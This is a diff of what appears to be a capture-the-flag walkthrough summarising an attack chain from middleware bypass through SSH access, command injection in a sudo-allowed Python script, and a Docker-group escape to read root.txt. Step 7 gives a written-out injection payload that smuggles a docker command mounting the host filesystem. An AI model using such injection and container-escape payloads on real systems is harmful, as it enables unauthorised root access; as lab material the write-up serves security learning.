@@ -7,7 +7,6 @@ step-by-step roadmap:
 5. Check sudo — sudo -l shows dev can run /opt/tools/sysreport.py as sysadmin (NOPASSWD).
 6. Command injection — sysreport.py does os.system(f"cat /var/reports/{report_type}.txt"). Inject with # to comment out .txt.
 7. Docker escape → root.txt — sysadmin is in docker group. Payload: sudo -u sysadmin /usr/bin/python3 /opt/tools/sysreport.py 'a;docker run -v /:/mnt/root alpine:latest cat /mnt/root/root/root.txt #'
-if you want to Qualification this challenge what it will be like SQLI to RCE ect ...
 
 Middleware Bypass → Credential Leak → SSH Access → Command Injection → Docker Escape
 
